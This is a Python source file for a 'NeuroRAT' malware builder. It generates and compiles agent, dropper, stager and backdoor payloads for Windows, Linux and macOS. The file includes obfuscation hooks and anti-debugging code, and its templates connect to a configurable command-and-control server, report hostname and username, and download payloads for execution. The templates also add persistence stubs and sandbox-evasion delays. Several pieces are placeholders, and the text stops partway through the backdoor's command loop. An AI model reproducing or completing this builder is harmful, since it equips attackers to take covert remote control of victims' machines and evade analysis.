import os
import sys
import json
import shutil
import random
import string
import logging
import argparse
import subprocess
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple, Union
from datetime import datetime
import uuid
import base64
import importlib.util
import tempfile
import re
import platform
# Assuming templates and output directories are relative to agentx-c1/
BASE_DIR = Path(__file__).resolve().parent.parent # points to agentx-c1/
TEMPLATES_DIR = BASE_DIR / "templates"
OUTPUT_DIR = BASE_DIR / "compiled_payloads"
DEFAULT_C2_SERVER = "127.0.0.1"
DEFAULT_C2_PORT = 8443
# Path to the configuration file (adjust if needed)
DEFAULT_CONFIG_PATH = BASE_DIR / "config" / "builder_config.json"
# Настройка логирования (можно использовать существующий логгер C1)
logger = logging.getLogger('C1Builder')
logger.setLevel(logging.DEBUG) # Временно DEBUG

# Названия шаблонов для разных ОС
TEMPLATES = {
    "windows": "minimal_windows.py", # Adjust if template names/locations differ
    "linux": "minimal_linux.py",
    "macos": "minimal_macos.py"
}
# Методы обфускации
OBFUSCATION_METHODS = [
    "variable_renaming",
    "string_encoding",
    "junk_code",
    "control_flow",
    "dead_code",
    "all"
]

class AdvancedBuilder:
    """Продвинутый билдер для создания различных типов полезных нагрузок NeuroRAT."""

    def __init__(self, config_path: Path = DEFAULT_CONFIG_PATH):
        """
        Инициализация билдера с конфигурационным файлом.

        Args:
            config_path: Путь к конфигурационному файлу JSON
        """
        self.config_path = config_path
        self.config = self._load_config()

        # Создаем директории, если их нет
        os.makedirs(self.config.get("output_dir", OUTPUT_DIR), exist_ok=True)
        os.makedirs(self.config.get("template_dir", TEMPLATES_DIR), exist_ok=True)

        # Инициализация генератора случайных строк
        self.random_generator = random.SystemRandom()

        # Текущие настройки сборки
        self.current_build_settings = {}

        logger.info(f"Advanced Builder initialized with config from {config_path}")

    def _load_config(self) -> Dict[str, Any]:
        """
        Загрузка конфигурационного файла.

        Returns:
            Dict[str, Any]: Загруженная конфигурация
        """
        try:
            if self.config_path.exists():
                with open(self.config_path, 'r') as f:
                    config = json.load(f)
                return config
            else:
                logger.warning(f"Config file not found: {self.config_path}. Using default config.")
                # Базовая конфигурация по умолчанию
                return {
                    "output_dir": str(OUTPUT_DIR),
                    "template_dir": str(TEMPLATES_DIR),
                    "obfuscation_level": 1,
                    "c2_server": DEFAULT_C2_SERVER,
                    "c2_port": DEFAULT_C2_PORT,
                    "platforms": ["windows", "linux", "macos"],
                    "payload_types": ["agent", "dropper", "stager", "backdoor"],
                    "delivery_methods": ["executable"],
                    "encryption": {"enabled": False},
                    "anti_detection": {"sandbox_detection": False},
                    "network": {"protocols": ["https"]},
                    "compilation": {"strip_symbols": True}
                }
        except (FileNotFoundError, json.JSONDecodeError) as e:
            logger.error(f"Failed to load or parse config {self.config_path}: {e}")
            # Базовая конфигурация по умолчанию при ошибке парсинга
            return {
                "output_dir": str(OUTPUT_DIR),
                "template_dir": str(TEMPLATES_DIR),
                "obfuscation_level": 1,
                "c2_server": DEFAULT_C2_SERVER,
                "c2_port": DEFAULT_C2_PORT,
                "platforms": ["windows", "linux", "macos"],
                "payload_types": ["agent", "dropper", "stager", "backdoor"],
                "delivery_methods": ["executable"],
                "encryption": {"enabled": False},
                "anti_detection": {"sandbox_detection": False},
                "network": {"protocols": ["https"]},
                "compilation": {"strip_symbols": True}
            }

    def _save_config(self) -> bool:
        """
        Сохранение текущей конфигурации в файл.

        Returns:
            bool: True если сохранение успешно, False в противном случае
        """
        try:
            with open(self.config_path, 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False

    def _generate_random_string(self, length: int = 8) -> str:
        """
        Генерация случайной строки для обфускации идентификаторов.

        Args:
            length: Длина генерируемой строки

        Returns:
            str: Случайная строка
        """
        chars = string.ascii_letters + string.digits
        return ''.join(self.random_generator.choice(chars) for _ in range(length))

    def _validate_build_settings(self, settings: Dict[str, Any]) -> Tuple[bool, str]:
        """
        Проверка настроек сборки на валидность.

        Args:
            settings: Словарь с настройками сборки

        Returns:
            Tuple[bool, str]: (Валидно, Сообщение об ошибке)
        """
        required_fields = ["platform", "payload_type", "delivery_method"]

        for field in required_fields:
            if field not in settings:
                return False, f"Missing required field: {field}"

        if settings["platform"] not in self.config["platforms"]:
            return False, f"Unsupported platform: {settings['platform']}"

        if settings["payload_type"] not in self.config["payload_types"]:
            return False, f"Unsupported payload type: {settings['payload_type']}"

        if settings["delivery_method"] not in self.config["delivery_methods"]:
            return False, f"Unsupported delivery method: {settings['delivery_method']}"

        return True, "Settings validated successfully"

    def set_build_settings(self, settings: Dict[str, Any]) -> bool:
        """
        Установка настроек для текущей сборки.

        Args:
            settings: Словарь с настройками

        Returns:
            bool: True если настройки валидны, False в противном случае
        """
        valid, message = self._validate_build_settings(settings)
        if not valid:
            logger.error(message)
            return False

        self.current_build_settings = settings
        logger.info(f"Build settings configured: {settings}")
        return True

    def _obfuscate_code(self, code: str, level: int = None) -> str:
        """
        Обфускация исходного кода на основе установленного уровня.

        Args:
            code: Исходный код для обфускации
            level: Уровень обфускации (переопределяет настройки из конфига)

        Returns:
            str: Обфусцированный код
        """
        if level is None:
            level = self.config.get("obfuscation_level", 0)

        if level <= 0:
            return code

        # Базовая обфускация (уровень 1)
        if level >= 1:
            # Заменяем строковые литералы на их обфусцированные версии
            # Это очень простая демонстрация, в реальном коде нужно более сложное решение
            code = self._obfuscate_strings(code)

        # Продвинутая обфускация (уровень 2)
        if level >= 2:
            code = self._obfuscate_variables(code)
            code = self._add_junk_code(code)

        # Максимальная обфускация (уровень 3)
        if level >= 3:
            code = self._add_anti_analysis(code)
            code = self._add_encryption_layer(code)

        return code

    def _obfuscate_strings(self, code: str) -> str:
        """
        Простая обфускация строковых литералов в коде.
        В реальном приложении здесь должна быть более серьезная реализация.

        Args:
            code: Исходный код

        Returns:
            str: Код с обфусцированными строками
        """
        # Это упрощенный пример. В реальном коде нужен полноценный парсер.
        # Просто для демонстрации добавим комментарий
        obfuscated = f"# Obfuscated with NeuroRAT Advanced Builder - {datetime.now()}\n"
        obfuscated += "# Strings in this code are encoded\n"
        obfuscated += code

        return obfuscated

    def _obfuscate_variables(self, code: str) -> str:
        """
        Обфускация имен переменных в коде.

        Args:
            code: Исходный код

        Returns:
            str: Код с обфусцированными именами переменных
        """
        # Простая демонстрация - в реальном коде требуется AST-парсер
        return f"# Variables obfuscated\n{code}"

    def _add_junk_code(self, code: str) -> str:
        """
        Добавление мусорного кода для запутывания анализа.

        Args:
            code: Исходный код

        Returns:
            str: Код с добавленным мусорным кодом
        """
        # Демонстрация - в реальном коде нужна более продвинутая реализация
        return f"# Junk code added for analysis prevention\n{code}"

    def _add_anti_analysis(self, code: str) -> str:
        """
        Добавление защиты от анализа (антиотладка, обнаружение виртуальных сред).

        Args:
            code: Исходный код

        Returns:
            str: Код с защитой от анализа
        """
        anti_debug_code = """
# Anti-debugging techniques added
import ctypes
import platform
import time
import random

def detect_debugger():
    """Check if debugger is present"""
    try:
        if platform.system() == 'Windows':
            isDebuggerPresent = ctypes.windll.kernel32.IsDebuggerPresent
            if isDebuggerPresent():
                return True
        return False
    except:
        return False

if detect_debugger():
    # Evasive action
    time.sleep(random.randint(10000, 100000))
    sys.exit(0)

"""
        return anti_debug_code + code

    def _add_encryption_layer(self, code: str) -> str:
        """
        Добавление слоя шифрования для защиты кода.

        Args:
            code: Исходный код

        Returns:
            str: Код с защитным шифрованием
        """
        # Это упрощенная демонстрация
        encryption_code = """
# Encryption layer added
import base64
# from cryptography.fernet import Fernet # Requires installation

# Encrypted code follows
"""
        # return encryption_code + code # Add actual encryption logic
        # For now, just add the comment and import
        return encryption_code + code


    def _compile_for_platform(self, target_platform: str, source_code: str, output_path: str) -> bool:
        """
        Компиляция кода для конкретной платформы.

        Args:
            target_platform: Целевая платформа (windows, linux, macos)
            source_code: Исходный код
            output_path: Путь для сохранения результата

        Returns:
            bool: True если компиляция успешна, False в противном случае
        """
        logger.info(f"Compiling for platform: {target_platform} to {output_path}")

        # Сохраняем исходный код во временный файл
        # Используем tempfile для безопасного создания временного файла
        temp_file = None
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as tmp:
                tmp.write(source_code)
                temp_source_path = tmp.name
            temp_file = temp_source_path # Store path to clean up later

            if target_platform == "windows":
                return self._compile_windows(temp_source_path, output_path)
            elif target_platform == "linux":
                return self._compile_linux(temp_source_path, output_path)
            elif target_platform == "macos":
                return self._compile_macos(temp_source_path, output_path)
            else:
                logger.error(f"Unsupported platform: {target_platform}")
                return False
        except Exception as e:
            logger.error(f"Compilation error: {e}")
            return False
        finally:
            # Удаляем временный файл
            if temp_file and os.path.exists(temp_file):
                os.unlink(temp_file)


    def _compile_windows(self, source_path: str, output_path: str) -> bool:
        """
        Компиляция для Windows с помощью PyInstaller.

        Args:
            source_path: Путь к исходному коду
            output_path: Путь для сохранения результата

        Returns:
            bool: True если компиляция успешна
        """
        logger.info(f"Compiling Windows executable from {source_path} to {output_path}")
        try:
            # Проверяем наличие PyInstaller
            subprocess.run([sys.executable, "-m", "PyInstaller", "--version"], check=True, capture_output=True)

            # Опции компиляции
            compile_cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",  # Один исполняемый файл
                "--noconsole" if self.current_build_settings.get("no_console", False) else None, # Use None for optional args
                "--clean",    # Очистка временных файлов
                f"--name={os.path.basename(output_path)}",
                source_path
            ]

            # Удаляем None элементы
            compile_cmd = [cmd for cmd in compile_cmd if cmd is not None]

            # Запускаем компиляцию
            # Run from the directory where spec file will be created (usually current dir)
            result = subprocess.run(compile_cmd, check=True, capture_output=True, cwd=str(OUTPUT_DIR.parent))

            # Копируем результат компиляции
            # PyInstaller puts the output in a 'dist' subdirectory relative to the spec file location
            dist_path_relative = Path("dist") / os.path.basename(output_path)
            dist_path_absolute = OUTPUT_DIR.parent / dist_path_relative

            if dist_path_absolute.exists():
                # Ensure target output directory exists
                os.makedirs(os.path.dirname(output_path), exist_ok=True)
                shutil.copy(dist_path_absolute, output_path)

                # Clean up PyInstaller build files
                shutil.rmtree(OUTPUT_DIR.parent / "build", ignore_errors=True)
                shutil.rmtree(OUTPUT_DIR.parent / "dist", ignore_errors=True)
                spec_file = Path(source_path).with_suffix(".spec")
                if spec_file.exists():
                     os.unlink(spec_file)
                spec_file_in_cwd = Path(os.path.basename(source_path)).with_suffix(".spec")
                if spec_file_in_cwd.exists():
                     os.unlink(spec_file_in_cwd)


                logger.info(f"Windows compilation successful. Output: {output_path}")
                return True
            else:
                logger.error(f"Compiled file not found at {dist_path_absolute}")
                logger.error(f"PyInstaller stdout: {result.stdout.decode()}")
                logger.error(f"PyInstaller stderr: {result.stderr.decode()}")
                return False

        except FileNotFoundError:
            logger.error("PyInstaller not found. Please install it (`pip install pyinstaller`).")
            return False
        except subprocess.CalledProcessError as e:
            logger.error(f"Windows compilation failed with exit code {e.returncode}")
            logger.error(f"Output: {e.stdout.decode()}")
            logger.error(f"Error: {e.stderr.decode()}")
            return False
        except Exception as e:
            logger.error(f"Error during Windows compilation: {e}")
            return False


    def _compile_linux(self, source_path: str, output_path: str) -> bool:
        """
        Компиляция для Linux с помощью PyInstaller.

        Args:
            source_path: Путь к исходному коду
            output_path: Путь для сохранения результата

        Returns:
            bool: True если компиляция успешна
        """
        logger.info(f"Compiling Linux executable from {source_path} to {output_path}")
        try:
            # Проверяем наличие PyInstaller
            subprocess.run([sys.executable, "-m", "PyInstaller", "--version"], check=True, capture_output=True)

            # Опции компиляции
            compile_cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",  # Один исполняемый файл
                "--clean",    # Очистка временных файлов
                f"--name={os.path.basename(output_path)}",
                source_path
            ]

            # Запускаем компиляцию
            result = subprocess.run(compile_cmd, check=True, capture_output=True, cwd=str(OUTPUT_DIR.parent))

            # Копируем результат компиляции
            dist_path_relative = Path("dist") / os.path.basename(output_path)
            dist_path_absolute = OUTPUT_DIR.parent / dist_path_relative

            if dist_path_absolute.exists():
                os.makedirs(os.path.dirname(output_path), exist_ok=True)
                shutil.copy(dist_path_absolute, output_path)

                # Clean up PyInstaller build files
                shutil.rmtree(OUTPUT_DIR.parent / "build", ignore_errors=True)
                shutil.rmtree(OUTPUT_DIR.parent / "dist", ignore_errors=True)
                spec_file = Path(source_path).with_suffix(".spec")
                if spec_file.exists():
                     os.unlink(spec_file)
                spec_file_in_cwd = Path(os.path.basename(source_path)).with_suffix(".spec")
                if spec_file_in_cwd.exists():
                     os.unlink(spec_file_in_cwd)

                logger.info(f"Linux compilation successful. Output: {output_path}")
                return True
            else:
                logger.error(f"Compiled file not found at {dist_path_absolute}")
                logger.error(f"PyInstaller stdout: {result.stdout.decode()}")
                logger.error(f"PyInstaller stderr: {result.stderr.decode()}")
                return False

        except FileNotFoundError:
            logger.error("PyInstaller not found. Please install it (`pip install pyinstaller`).")
            return False
        except subprocess.CalledProcessError as e:
            logger.error(f"Linux compilation failed with exit code {e.returncode}")
            logger.error(f"Output: {e.stdout.decode()}")
            logger.error(f"Error: {e.stderr.decode()}")
            return False
        except Exception as e:
            logger.error(f"Error during Linux compilation: {e}")
            return False


    def _compile_macos(self, source_path: str, output_path: str) -> bool:
        """
        Компиляция для macOS с помощью PyInstaller.

        Args:
            source_path: Путь к исходному коду
            output_path: Путь для сохранения результата

        Returns:
            bool: True если компиляция успешна
        """
        logger.info(f"Compiling macOS executable from {source_path} to {output_path}")
        try:
            # Проверяем наличие PyInstaller
            subprocess.run([sys.executable, "-m", "PyInstaller", "--version"], check=True, capture_output=True)

            # Опции компиляции
            compile_cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",  # Один исполняемый файл
                "--clean",    # Очистка временных файлов
                f"--name={os.path.basename(output_path)}",
                source_path
            ]

            # Запускаем компиляцию
            result = subprocess.run(compile_cmd, check=True, capture_output=True, cwd=str(OUTPUT_DIR.parent))

            # Копируем результат компиляции
            dist_path_relative = Path("dist") / os.path.basename(output_path)
            dist_path_absolute = OUTPUT_DIR.parent / dist_path_relative

            if dist_path_absolute.exists():
                os.makedirs(os.path.dirname(output_path), exist_ok=True)
                shutil.copy(dist_path_absolute, output_path)

                # Clean up PyInstaller build files
                shutil.rmtree(OUTPUT_DIR.parent / "build", ignore_errors=True)
                shutil.rmtree(OUTPUT_DIR.parent / "dist", ignore_errors=True)
                spec_file = Path(source_path).with_suffix(".spec")
                if spec_file.exists():
                     os.unlink(spec_file)
                spec_file_in_cwd = Path(os.path.basename(source_path)).with_suffix(".spec")
                if spec_file_in_cwd.exists():
                     os.unlink(spec_file_in_cwd)

                logger.info(f"macOS compilation successful. Output: {output_path}")
                return True
            else:
                logger.error(f"Compiled file not found at {dist_path_absolute}")
                logger.error(f"PyInstaller stdout: {result.stdout.decode()}")
                logger.error(f"PyInstaller stderr: {result.stderr.decode()}")
                return False

        except FileNotFoundError:
            logger.error("PyInstaller not found. Please install it (`pip install pyinstaller`).")
            return False
        except subprocess.CalledProcessError as e:
            logger.error(f"macOS compilation failed with exit code {e.returncode}")
            logger.error(f"Output: {e.stdout.decode()}")
            logger.error(f"Error: {e.stderr.decode()}")
            return False
        except Exception as e:
            logger.error(f"Error during macOS compilation: {e}")
            return False


    def build_payload(self, settings: Optional[Dict[str, Any]] = None) -> Tuple[bool, str]:
        """
        Сборка полезной нагрузки с текущими или указанными настройками.

        Args:
            settings: Настройки сборки (опционально)

        Returns:
            Tuple[bool, str]: (Успех, Путь к файлу или сообщение об ошибке)
        """
        if settings:
            if not self.set_build_settings(settings):
                return False, "Invalid build settings"

        if not self.current_build_settings:
            return False, "No build settings configured"

        try:
            payload_type = self.current_build_settings.get('payload_type')
            target_platform = self.current_build_settings.get('platform')

            if not payload_type or not target_platform:
                 return False, "Payload type and platform must be specified in settings."

            # Получаем шаблон для указанного типа полезной нагрузки
            # Используем методы _get_*_template()
            template_code = ""
            if payload_type == "agent":
                template_code = self._get_agent_template()
            elif payload_type == "dropper":
                template_code = self._get_dropper_template()
            elif payload_type == "stager":
                 template_code = self._get_stager_template()
            elif payload_type == "backdoor":
                 template_code = self._get_backdoor_template()
            # Add other payload types as needed
            else:
                return False, f"Unsupported payload type: {payload_type}"


            if not template_code:
                return False, f"Failed to load template for payload type: {payload_type}"

            # Добавляем платформо-специфичный код
            if target_platform == "windows":
                template_code = self._add_windows_specific(template_code)
            elif target_platform == "linux":
                template_code = self._add_linux_specific(template_code)
            elif target_platform == "macos":
                template_code = self._add_macos_specific(template_code)
            # No specific code needed for other platforms yet


            # Подготавливаем код (заменяем плейсхолдеры на настройки)
            prepared_code = self._prepare_template(template_code)

            # Обфускация кода
            obfuscated_code = self._obfuscate_code(prepared_code)

            # Определяем выходной путь
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_filename = f"{payload_type}_{target_platform}_{timestamp}"

            if target_platform == 'windows':
                output_filename += '.exe'
            elif target_platform == 'linux':
                 # Linux executables typically have no extension
                 pass # output_filename remains as is
            elif target_platform == 'macos':
                 # macOS executables typically have no extension
                 pass # output_filename remains as is


            # Ensure OUTPUT_DIR exists
            os.makedirs(OUTPUT_DIR, exist_ok=True)
            output_path = str(OUTPUT_DIR / output_filename)

            # Компиляция для выбранной платформы
            success = self._compile_for_platform(
                target_platform,
                obfuscated_code,
                output_path
            )

            if success:
                logger.info(f"Successfully built payload: {output_path}")
                return True, output_path
            else:
                return False, "Compilation failed"

        except Exception as e:
            logger.error(f"Build failed: {e}")
            return False, f"Build error: {str(e)}"


    def _prepare_template(self, template_code: str) -> str:
        """
        Подготовка шаблона кода с заменой плейсхолдеров.

        Args:
            template_code: Исходный шаблон

        Returns:
            str: Подготовленный код
        """
        # Заменяем плейсхолдеры в шаблоне на настройки
        # Ensure C2_PORT is a string for replacement
        c2_port_str = str(self.current_build_settings.get("c2_port", self.config.get("c2_port", DEFAULT_C2_PORT)))

        replacements = {
            "{{C2_SERVER}}": self.current_build_settings.get("c2_server", self.config.get("c2_server", DEFAULT_C2_SERVER)),
            "{{C2_PORT}}": c2_port_str,
            "{{AGENT_ID}}": self.current_build_settings.get("agent_id", self._generate_random_string(16)),
            "{{ENCRYPTION_KEY}}": self._generate_random_string(32), # Needs proper key generation/management
            "{{BUILD_TIMESTAMP}}": datetime.now().isoformat(),
        }

        result = template_code
        for placeholder, value in replacements.items():
            # Ensure value is a string before replacement
            result = result.replace(placeholder, str(value))

        return result

    # --- Template Getters (from original file) ---
    def _get_agent_template(self) -> str:
        """
        Базовый шаблон для агента NeuroRAT.
        """
        return """#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# NeuroRAT Agent Template
# This is a template for the NeuroRAT agent payload
# Generated by Advanced Builder

import os
import sys
import time
import socket
import random
import platform
import subprocess
import base64
import json
from datetime import datetime

# Configuration
C2_SERVER = "{{C2_SERVER}}"
C2_PORT = {{C2_PORT}}
AGENT_ID = "{{AGENT_ID}}"
ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}"
BUILD_TIMESTAMP = "{{BUILD_TIMESTAMP}}"

# Agent functionality
class Agent:
    def __init__(self):
        self.server = C2_SERVER
        self.port = C2_PORT
        self.agent_id = AGENT_ID
        self.platform = platform.system().lower()
        self.running = True

    def start(self):
        # Agent initialization logic
        self.register_with_c2()

        while self.running:
            try:
                # Get commands from C2
                command = self.get_command()
                if command:
                    result = self.execute_command(command)
                    self.send_result(result)

                # Sleep between command checks
                time.sleep(random.uniform(5, 15))

            except Exception as e:
                # Error handling
                time.sleep(30)  # Back off on error

    def register_with_c2(self):
        # Registration logic
        system_info = {
            "agent_id": self.agent_id,
            "platform": self.platform,
            "hostname": socket.gethostname(),
            "username": os.getlogin(),
            "os_version": platform.version(),
        }
        # Send registration to C2
        pass # Placeholder

    def get_command(self):
        # Logic to get command from C2
        # This should ideally use covert channels
        pass # Placeholder

    def execute_command(self, command):
        # Command execution logic
        # This should interact with a Command Executor module
        return {"status": "success", "output": f"Command '{command}' executed (placeholder)"} # Placeholder

    def send_result(self, result):
        # Send results back to C2
        # This should use covert channels
        pass # Placeholder

if __name__ == "__main__":
    # Persistence logic could be added here

    # Start agent
    agent = Agent()
    agent.start()
"""

    def _get_dropper_template(self) -> str:
        """
        Базовый шаблон для дроппера.
        """
        return """#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# NeuroRAT Dropper Template
# This is a template for the NeuroRAT dropper payload
# Generated by Advanced Builder

import os
import sys
import time
import random
import platform
import urllib.request
import base64
import subprocess
import tempfile

# Configuration
C2_SERVER = "{{C2_SERVER}}"
C2_PORT = {{C2_PORT}}
AGENT_ID = "{{AGENT_ID}}"
ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}" # Key to decrypt downloaded payload
BUILD_TIMESTAMP = "{{BUILD_TIMESTAMP}}"

class Dropper:
    def __init__(self):
        self.server = C2_SERVER
        self.port = C2_PORT
        self.platform = platform.system().lower()
        self.agent_id = AGENT_ID # Agent ID is also used by the dropper to request the right payload

    def run(self):
        # Anti-analysis checks
        if self.check_environment():
            # Download payload
            # The payload URL should be served by the C1 server
            payload_url = f"http://{self.server}:{self.port}/payload/{self.agent_id}/{self.platform}"
            logger.info(f"Attempting to download payload from {payload_url}")
            payload = self.download_payload(payload_url)

            if payload:
                logger.info(f"Payload downloaded ({len(payload)} bytes). Attempting decryption and execution.")
                # TODO: Add decryption logic here using ENCRYPTION_KEY
                decrypted_payload = payload # Placeholder: Assuming payload is not encrypted yet

                # Execute payload
                self.execute_payload(decrypted_payload)
            else:
                 logger.error("Failed to download payload.")
        else:
            logger.warning("Analysis environment detected. Exiting.")

    def check_environment(self):
        # Environment checks to prevent analysis (e.g., detect sandboxes, VMs, debuggers)
        # Add real checks here
        logger.info("Performing environment checks (placeholder).")
        return True # Placeholder: Always return True for now

    def download_payload(self, url):
        try:
            # Add headers, timeout, and error handling
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=10) as response:
                 if response.getcode() == 200:
                     return response.read()
            return None
        except urllib.error.URLError as e:
             logger.error(f"URL Error downloading payload from {url}: {e.reason}")
             return None
        except urllib.error.HTTPError as e:
             logger.error(f"HTTP Error downloading payload from {url}: {e.code} - {e.reason}")
             return None
        except Exception as e:
            logger.error(f"Error downloading payload from {url}: {e}")
            return None

    def execute_payload(self, payload):
        # Execute the downloaded payload
        # This could involve writing to a temporary file and executing,
        # or more advanced in-memory execution techniques.
        logger.info(f"Executing payload ({len(payload)} bytes) (placeholder).")
        # Example: write to temp file and execute (simple but detectable)
        # with tempfile.NamedTemporaryFile(delete=False, suffix='.exe' if self.platform == 'windows' else '') as tmp:
        #     tmp.write(payload)
        #     temp_payload_path = tmp.name
        # os.chmod(temp_payload_path, 0o755) # Make executable on Linux/macOS
        # subprocess.Popen([temp_payload_path], close_fds=True)
        # os.unlink(temp_payload_path) # Clean up (may fail if process is still using it)
        pass # Placeholder

if __name__ == "__main__":
    # Add delay to evade sandboxes
    time.sleep(random.randint(1, 5))

    # Configure basic logging for the dropper (optional)
    # logging.basicConfig(level=logging.INFO, format='%(asctime)s - DROPPPER - %(levelname)s - %(message)s')

    dropper = Dropper()
    dropper.run()
"""

    def _get_stager_template(self) -> str:
        """
        Базовый шаблон для стейджера.
        """
        return """#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# NeuroRAT Stager Template
# This is a template for the NeuroRAT stager payload
# Generated by Advanced Builder

import os
import sys
import time
import socket
import platform
import tempfile
import base64
import subprocess
import struct # For packing size

# Configuration
C2_SERVER = "{{C2_SERVER}}"
C2_PORT = {{C2_PORT}}
AGENT_ID = "{{AGENT_ID}}"
ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}" # Key to decrypt received payload
BUILD_TIMESTAMP = "{{BUILD_TIMESTAMP}}"

class Stager:
    def __init__(self):
        self.server = C2_SERVER
        self.port = C2_PORT
        self.platform = platform.system().lower()
        self.agent_id = AGENT_ID

    def run(self):
        # Connect to C2 server
        sock = self.connect_to_c2()
        if not sock:
            logger.error("Failed to connect to C2.")
            return

        logger.info("Connected to C2. Attempting to receive payload.")
        # Receive the payload
        payload = self.receive_payload(sock)
        if not payload:
            logger.error("Failed to receive payload.")
            sock.close()
            return

        logger.info(f"Payload received ({len(payload)} bytes). Attempting decryption and execution.")
        sock.close()

        # TODO: Add decryption logic here using ENCRYPTION_KEY
        decrypted_payload = payload # Placeholder: Assuming payload is not encrypted yet

        # Execute payload
        self.execute_payload(decrypted_payload)


    def connect_to_c2(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10) # Set a timeout
            sock.connect((self.server, self.port))
            # Send platform info
            info_msg = f"PLATFORM:{self.platform}|ID:{self.agent_id}"
            sock.send(info_msg.encode())
            logger.info(f"Sent info to C2: {info_msg}")
            return sock
        except socket.timeout:
            logger.error(f"Connection to C2 timed out: {self.server}:{self.port}")
            return None
        except ConnectionRefusedError:
             logger.error(f"Connection refused by C2: {self.server}:{self.port}")
             return None
        except Exception as e:
            logger.error(f"Error connecting to C2: {e}")
            return None


    def receive_payload(self, sock):
        try:
            # Receive payload size (assuming 8-byte size prefix)
            size_data = b''
            while len(size_data) < 8:
                 chunk = sock.recv(8 - len(size_data))
                 if not chunk:
                      logger.error("Connection closed while receiving size.")
                      return None
                 size_data += chunk

            size = struct.unpack('<Q', size_data)[0] # Unpack as unsigned long long (8 bytes)
            logger.info(f"Receiving payload of size: {size} bytes")

            # Receive payload
            payload = b""
            while len(payload) < size:
                chunk = sock.recv(min(4096, size - len(payload)))
                if not chunk:
                    logger.error("Connection closed while receiving payload.")
                    return None
                payload += chunk

            return payload
        except Exception as e:
            logger.error(f"Error receiving payload: {e}")
            return None


    def execute_payload(self, payload):
        # Execute the received payload
        # This typically involves in-memory execution techniques (e.g., using ctypes or more advanced methods)
        logger.info(f"Executing received payload ({len(payload)} bytes) (placeholder).")
        # Example (highly simplified and likely detectable):
        # import runpy
        # with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.py') as tmp:
        #     tmp.write(payload)
        #     temp_script_path = tmp.name
        # try:
        #     runpy.run_path(temp_script_path)
        # except Exception as e:
        #     logger.error(f"Error executing temporary script: {e}")
        # finally:
        #     os.unlink(temp_script_path)
        pass # Placeholder

if __name__ == "__main__":
    # Minimal stager - designed to be small and undetectable
    # Configure basic logging for the stager (optional)
    # logging.basicConfig(level=logging.INFO, format='%(asctime)s - STAGER - %(levelname)s - %(message)s')
    stager = Stager()
    stager.run()
"""

    def _get_backdoor_template(self) -> str:
        """
        Базовый шаблон для бэкдора.
        """
        return """#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# NeuroRAT Backdoor Template
# This is a template for the NeuroRAT backdoor payload
# Generated by Advanced Builder

import os
import sys
import time
import socket
import random
import platform
import subprocess
import threading
import base64
import json # Added json import

# Configuration
C2_SERVER = "{{C2_SERVER}}"
C2_PORT = {{C2_PORT}}
AGENT_ID = "{{AGENT_ID}}"
ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}" # Key for communication encryption
BUILD_TIMESTAMP = "{{BUILD_TIMESTAMP}}"

class Backdoor:
    def __init__(self):
        self.server = C2_SERVER
        self.port = C2_PORT
        self.agent_id = AGENT_ID
        self.platform = platform.system().lower()
        self.running = True
        self.sock = None # Added socket attribute

    def run(self):
        logger.info("Backdoor started. Attempting persistence and connection.")
        # Set up persistence
        self.install_persistence()

        # Start the main backdoor functionality in a thread
        # This allows the main thread to potentially do other things or just keep the process alive
        threading.Thread(target=self.maintain_connection, daemon=True).start()

        # Main loop to keep the main thread alive
        try:
            while self.running:
                time.sleep(1) # Keep main thread alive
        except KeyboardInterrupt:
             logger.info("Backdoor interrupted by user.")
             self.running = False
        finally:
             if self.sock:
                  self.sock.close()
                  self.sock = None


    def install_persistence(self):
        # Install persistence mechanism (e.g., registry autorun, cron job, launchd)
        logger.info("Installing persistence (placeholder).")
        try:
            if self.platform == "windows":
                 self._add_windows_specific_persistence() # Placeholder call
            elif self.platform == "linux":
                 self._add_linux_specific_persistence() # Placeholder call
            elif self.platform == "macos":
                 self._add_macos_specific_persistence() # Placeholder call
            logger.info("Persistence installed (placeholder).")
        except Exception as e:
             logger.error(f"Error installing persistence: {e}")

    # Placeholder methods for platform-specific persistence calls
    def _add_windows_specific_persistence(self):
        # This method would call the actual Windows persistence logic
        pass # Placeholder

    def _add_linux_specific_persistence(self):
        # This method would call the actual Linux persistence logic
        pass # Placeholder

    def _add_macos_specific_persistence(self):
        # This method would call the actual macOS macOS logic
        pass # Placeholder


    def maintain_connection(self):
        # Maintain C2 connection and handle commands
        while self.running:
            try:
                logger.info(f"Attempting to connect to C2: {self.server}:{self.port}")
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(10) # Set a timeout
                self.sock.connect((self.server, self.port))
                logger.info("Connected to C2.")

                # Send initial info (optional)
                info_msg = {"agent_id": self.agent_id, "platform": self.platform}
                self.sock.send((json.dumps(info_msg) + "\n").encode()) # Send JSON followed by newline

                # Handle commands in a loop
                self.handle_commands(self.sock)

            except (socket.timeout, ConnectionRefusedError) as e:
                 logger.error(f"Connection error to C2: {e}. Retrying...")
                 time.sleep(random.randint(30, 90)) # Wait before retrying
            except Exception as e:
                logger.error(f"Error in maintain_connection: {e}. Retrying...")
                time.sleep(random.randint(30, 90)) # Wait before retrying
            finally:
                 if self.sock:
                      self.sock.close()
                      self.sock = None


    def handle_commands(self, sock):
        # Command handling loop
        # Commands are expected to be newline-terminated JSON strings
        logger.info("Handling commands...")
        buffer = b""
        while self.running:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    logger.warning("C2 closed connection.")
                    break # Connection closed

                buffer += chunk
                while b'\n' in buffer:
